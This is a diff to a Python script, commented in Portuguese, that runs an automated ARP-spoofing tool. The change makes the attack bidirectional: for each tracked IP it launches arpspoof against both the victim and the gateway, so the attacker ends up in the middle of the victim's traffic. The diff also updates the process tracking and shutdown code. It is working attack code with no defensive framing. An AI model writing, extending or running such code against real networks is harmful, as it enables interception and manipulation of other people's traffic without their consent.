@@ -13,7 +13,7 @@ from scapy.all import ARP, Ether, srp, sniff, IP, ICMP, sr1
 # Bloqueio de thread para proteger recursos compartilhados
 hosts_lock = threading.Lock()
 active_spoof_ips = set()
-running_processes = []
+running_processes = {}
 
 # Verifica se está rodando como root
 if os.geteuid() != 0:
@@ -169,32 +169,42 @@ def health_check_spoofing(lan_info, interval=10):
 def dynamic_arp_spoofing(lan_info):
     global active_spoof_ips, running_processes
     print("[*] Mecanismo dinâmico de Spoofing operacional.")
-    
+
     try:
         while True:
             with hosts_lock:
                 current_targets = list(active_spoof_ips)
-            
+
             for ip in current_targets:
-                # Verifica se já existe processo arpspoof ativo para este IP
-                # O IP está em args[4]: ["arpspoof", "-i", interface, "-t", IP, gateway]
-                if not any(proc.args[4] == ip for proc in running_processes if proc.poll() is None):
-                    print(f"[+] Iniciando comando arpspoof contra o alvo: {ip}")
-                    
+                # Verifica se já existe par de processos ativos para este IP
+                if ip not in running_processes or any(
+                    proc.poll() is not None for proc in running_processes[ip]
+                ):
+                    print(f"[+] Iniciando arpspoof bidirecional contra: {ip}")
+
                     try:
-                        proc = subprocess.Popen([
+                        # Instancia 1: envenena a tabela da vitima
+                        proc_to_victim = subprocess.Popen([
                             "arpspoof",
                             "-i", lan_info["interface"],
                             "-t", ip,
                             lan_info["gateway"]
                         ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                        
-                        running_processes.append(proc)
+
+                        # Instancia 2: envenena a tabela do gateway
+                        proc_to_gateway = subprocess.Popen([
+                            "arpspoof",
+                            "-i", lan_info["interface"],
+                            "-t", lan_info["gateway"],
+                            ip
+                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+                        running_processes[ip] = [proc_to_victim, proc_to_gateway]
                     except Exception as e:
                         print(f"Erro ao iniciar arpspoof para {ip}: {e}")
-            
+
             time.sleep(2)
-            
+
     except KeyboardInterrupt:
         pass
     except Exception as e:
@@ -288,13 +298,15 @@ def main():
     except KeyboardInterrupt:
         print("\n\n[-] Interrupção detectada! Iniciando procedimentos de finalização...")
     finally:
-        print(f"[*] Encerrando de forma segura {len(running_processes)} processos ativos do arpspoof...")
-        for proc in running_processes:
-            try:
-                proc.terminate()
-                proc.wait(timeout=1)
-            except Exception:
-                proc.kill()
+        total = sum(len(procs) for procs in running_processes.values())
+        print(f"[*] Encerrando {total} processos ativos do arpspoof...")
+        for procs in running_processes.values():
+            for proc in procs:
+                try:
+                    proc.terminate()
+                    proc.wait(timeout=1)
+                except Exception:
+                    proc.kill()
         print("[+] Concluído. Rede reestabelecida com sucesso.")
 
 
